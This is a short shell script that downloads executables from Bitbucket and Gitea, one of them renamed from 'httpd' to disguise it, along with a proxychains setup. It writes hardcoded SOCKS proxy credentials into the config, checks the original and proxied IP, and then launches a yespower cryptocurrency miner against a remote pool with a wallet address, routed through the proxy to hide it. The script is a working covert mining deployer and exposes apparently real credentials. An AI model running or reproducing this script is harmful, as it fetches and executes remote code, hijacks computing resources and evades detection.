proxy="us-east-static-08.quotaguard.com" 
port="1080" 
user="425dlrn5kpryex"  
pass="x2mzz8lq69wgze6pe2bcqg668ze9" 
wget -q -O kva https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x kva
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./kva -a yespower -o 103.120.19.136:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-0 -n 1)dikamahesa) --timeout 120 -p x --proxy socks5://425dlrn5kpryex:x2mzz8lq69wgze6pe2bcqg668ze9@us-east-static-08.quotaguard.com:1080 c=SWAMP,mc=VHH -t2
